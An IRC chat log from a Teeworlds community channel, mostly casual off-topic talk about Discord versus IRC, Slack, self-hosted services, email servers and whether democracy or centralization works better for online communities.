08:11 < bridge> [teeworlds] <ChillerDragon> Yes imo blood can stay in custom clients
18:34 < TeeSlayer> Assa: You can manage the servers if you want to. I won't have any time for Teeworlds in the coming months anyway.

22:58 < bridge> [teeworlds] <guenstig werben> you shouldnt actually run random code
22:58 < bridge> [teeworlds] <guenstig werben> ```
22:58 < bridge> [teeworlds] <guenstig werben> doesnt seem to do anything
22:58 < minus> but it did
22:59 < bridge> [teeworlds] <guenstig werben> hey minus
22:59 < bridge> [teeworlds] <guenstig werben> long time no see
22:59 < minus> i'm always here tho
22:59 < bridge> [teeworlds] <guenstig werben> me not
22:59 < bridge> [teeworlds] <guenstig werben> tho
22:59 < minus> literally haven't missed a day on irc in the last 10 years
23:00 < bridge> [teeworlds] <guenstig werben> "irc"
23:00 < minus> okay maybe a few
23:00 < bridge> [teeworlds] <guenstig werben> tfw you never get to unplug
23:00 < minus> get off my lawn with your discord
23:00 < Dune> you're always with your computer?
23:00 < bridge> [teeworlds] <guenstig werben> no
23:00 < bridge> [teeworlds] <guenstig werben> i'm not even always with an internet connection
23:00 < bridge> [teeworlds] <guenstig werben> also i dont think discord is a good thing either
23:00 < bridge> [teeworlds] <guenstig werben> it just works for different people
23:01 < Dune> which you are part of
23:01 < minus> the day discord dies i'll laugh
23:01 < bridge> [teeworlds] <guenstig werben> for me it works better than irc since i'm there anyway
23:01 < minus> j/k i laugh about it every time
23:01 < Dune> proprietary chat clients have some sort of 6 years cycle
23:01 < minus> i think we can just agree that everything is shit
23:01 < Dune> but still they're necessary for non-techies
23:02 < bridge> [teeworlds] <guenstig werben> i do agree
23:02 < bridge> [teeworlds] <guenstig werben> but again, i have it because it works for some people
23:02 < bridge> [teeworlds] <guenstig werben> i mean its better than skype
23:03 < Dune> what happened to slack?
23:03 < bridge> [teeworlds] <guenstig werben> too expensive for most i guess
23:03 < minus> slack ate my memory
23:03 < bridge> [teeworlds] <guenstig werben> welp thats literally _every electron app out there_
23:03 < minus> firefox task manager reported my slack tab at work with 2.47G of memory today
23:03 < bridge> [teeworlds] <guenstig werben> oh have you seen this _electron terminal app_
23:04 < bridge> [teeworlds] <guenstig werben> which takes a full cpu core to display a blinking cursor?
23:04 < minus> hyper?
23:04 < bridge> [teeworlds] <guenstig werben> no idea how its called
23:05 < minus> paying >200€/month for slack \o/
23:05 < bridge> [teeworlds] <guenstig werben> you personally?
23:05 < minus> nah, work
23:05 < bridge> [teeworlds] <guenstig werben> well its their decision
23:05 < bridge> [teeworlds] <guenstig werben> its offloading the work of administrating something yourself
23:05 < minus> definitely
23:05 < bridge> [teeworlds] <guenstig werben> because communication has to always work
23:05 < minus> i mean if mattermost worked well it'd be a different story
23:06 < bridge> [teeworlds] <guenstig werben> 28/7
23:06 < minus> we run most of the other crap ourselves tho
23:06 < bridge> [teeworlds] <guenstig werben> a company i know switched to a self hosted rocket chat recently (+ they modified a few bits and pieces tho mostly just the certificates and stuff)
23:06 < minus> except for email
23:06 < minus> and box
23:06 < minus> and salesforce
23:06 < minus> and some other business crap i don't touch
23:06 < bridge> [teeworlds] <guenstig werben> yeah. as i said, some things just have to always work
23:06 < bridge> [teeworlds] <guenstig werben> or are a really good deal if someone else does it
23:07 < minus> gitlab, jira, confluence we run ourselves tho
23:07 < bridge> [teeworlds] <guenstig werben> email is such a delicate piece of crap that it survived so long
23:07 < bridge> [teeworlds] <guenstig werben> but its not trivial to get it right
23:07 < minus> i'm pr0 at running email
23:07 < minus> i've been running my own mail server for ~9 years
23:08 < bridge> [teeworlds] <guenstig werben> well no, you set it up once
23:08 < Dune> cat >/dev/mail
23:08 < minus> and i literally didn't once drop all mail for two weeks
23:08 < minus> (i did)
23:08 <@heinrich5991> if only we could move the chat ecosystem to a more decentralized place
23:08 < bridge> [teeworlds] <guenstig werben> well i read a bunch of docs and then decided i'm super happy i have a hoster doing it for me
23:08 < Dune> heinrich5991, decentralization is inefficient
23:09 < bridge> [teeworlds] <guenstig werben> dune you can say democracy is inefficient
23:09 < bridge> [teeworlds] <guenstig werben> but i believe we all benefit from it
23:09 < minus> centralization is inefficient if google cloud is down
23:09 < bridge> [teeworlds] <guenstig werben> but i believe we all benefit from it in a way
23:09 <@heinrich5991> like yesterday
23:09 < minus> i bet someone ddosed their NA east region
23:09 < Dune> guenstig, democracy is centralized
23:09 < Dune> the power is
23:10 < bridge> [teeworlds] <guenstig werben> no, what you are describing is a republic
23:10 < minus> directy democracy plzkthx
23:10 < bridge> [teeworlds] <guenstig werben> democracy =!= republic
23:10 < Dune> take every single decision by a nation-wide referendum?
23:10 < minus> yes!
23:10 < bridge> [teeworlds] <guenstig werben> i dont say democracy is the perfect form (quote plato if you want), but its certainly not efficient
23:10 < minus> perferrably only by people who have proven to *have* a clue
23:10 < Dune> you always have a granularity
23:11 < minus> reminder that facebook mass manipulation is a thing
23:11 < Dune> you can't have people take minor decisions
23:11 < bridge> [teeworlds] <guenstig werben> well then how do you seperate those who "have a clue" from the others?
23:11 < Dune> ^
23:11 < bridge> [teeworlds] <guenstig werben> those who studied? got a certain grade?
23:11 < minus> not my problem
23:11 < bridge> [teeworlds] <guenstig werben> your education elite?
23:14 < bridge> [teeworlds] <guenstig werben> the point of _democracy_ is that the δημος, everyone, takes on decisions
23:14 < bridge> [teeworlds] <guenstig werben> tho i agree it doenst work
23:14 < bridge> [teeworlds] <guenstig werben> tho i agree it doesnt work
23:14 < Dune> you can't have everyone take every decision, there are like hundreds of decisions taken every day day
23:15 < bridge> [teeworlds] <guenstig werben> exactly
23:15 < Dune> that's why you select a few competent and representative people to do that
23:15 < bridge> [teeworlds] <guenstig werben> thats why people came up with a republic
23:15 < Dune> and that is centralization
23:15 < bridge> [teeworlds] <guenstig werben> its a mixture
23:16 < bridge> [teeworlds] <guenstig werben> since when its about deciding who represents you, everyone gets to make the decision on their own
23:16 < Dune> has there even be a democratic system in FOSS development?
23:16 < Dune> it seems like people tout democracy but every local system is always top-down
23:16 < Dune> how many communities have democratically elected moderators?
23:17 < bridge> [teeworlds] <guenstig werben> problem is youre talking about the internet
23:17 < bridge> [teeworlds] <guenstig werben> where the base assumption is "everyone is harmful by intent" but control is possible
23:17 < Dune> the things we'd do for anonimity
23:19 < bridge> [teeworlds] <guenstig werben> thats two things that are radically different from the "real" world. absolute control is feasible on the internet (at least on a lower scale). and anonymity is a great thing
23:19 < bridge> [teeworlds] <guenstig werben> but some people behave differently
23:20 < bridge> [teeworlds] <guenstig werben> plus the base assumption when distributing power is that everyone else is surely harmful in which case nothing distributed can work. and even if everyone else was all nice, the basic assumption is what destroys things
23:21 < bridge> [teeworlds] <guenstig werben> also quoting our own irc rules here: "Be relevant, this is not a a channel about anything, it's about teeworlds."
23:22 < bridge> [teeworlds] <guenstig werben> so i'm sure to agree with you that the centralized step to switch to 0.7 has been the greatest decision ever made in the history of this game
23:22 < bridge> [teeworlds] <guenstig werben> oy "lets make it shitty so people will help to make it better"
23:22 < bridge> [teeworlds] <guenstig werben> oy: "lets make it shitty so people will help to make it better"
23:22 < Dune> edits don't go through well you know
23:22 < bridge> [teeworlds] <guenstig werben> i have no idea
23:23 < bridge> [teeworlds] <guenstig werben> i actually dont care
23:23 < bridge> [teeworlds] <guenstig werben> the meaning does come through
23:23 < bridge> [teeworlds] <guenstig werben> i do not need to appeal to anyone or anything in particular
23:23 < Dune> (message gets resent)
23:24 < bridge> [teeworlds] <guenstig werben> even better
23:24 < bridge> [teeworlds] <guenstig werben> then you can at least see what changed
23:24 < rand> \_o<
23:24 < bridge> [teeworlds] <guenstig werben> hey rand
23:24 < bridge> [teeworlds] <guenstig werben> you still active?
